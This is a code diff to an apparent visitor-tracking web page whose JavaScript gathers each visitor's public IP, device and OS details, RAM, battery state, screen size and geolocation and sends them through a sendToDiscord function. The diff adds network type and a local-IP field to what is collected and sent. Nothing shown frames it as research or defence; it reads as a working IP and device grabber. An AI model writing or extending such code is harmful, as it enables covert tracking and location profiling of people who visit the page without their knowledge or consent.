@@ -101,7 +101,7 @@
             request.send(JSON.stringify(params));
         }
 
-        function formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, coords = "Unavailable") {
+        function formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, networkType, localIP, coords = "Unavailable") {
             return `**Device Info**:
 **Public IP**: ${publicIP}
 **Local Time**: ${localTime}
@@ -113,6 +113,10 @@
 **Platform**: ${deviceInfo}
 **OS Info**: ${osInfo}
 **User Agent**: ${userAgent}
+
+**Network Info**:
+**Network Type**: ${networkType}
+**Local IP**: ${localIP}
 
 **Geolocation**:
 ${coords}`;
@@ -132,16 +136,25 @@ ${coords}`;
             const width = screen.width;
             const height = screen.height;
 
+            // Get network type (3g, 4g, Wi-Fi, etc.)
+            let networkType = "Unknown";
+            if (navigator.connection) {
+                networkType = navigator.connection.effectiveType || "Unknown";
+            }
+
+            // Handle local network IP (can't be accessed via JS directly in most cases)
+            const localIP = "Unavailable"; // Local IP can't be fetched directly via JavaScript in browsers.
+
             // Send all initial data except geolocation
             sendToDiscord(
-                formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging)
+                formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, networkType, localIP)
             );
 
             // Attempt to fetch geolocation
             try {
                 const coords = await fetchGeolocation();
                 sendToDiscord(
-                    formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, coords)
+                    formatMessage(publicIP, localTime, deviceInfo, osInfo, ram, userAgent, width, height, batteryPercentage, isCharging, networkType, localIP, coords)
                 );
             } catch (errorCode) {
                 if (errorCode === 1) {
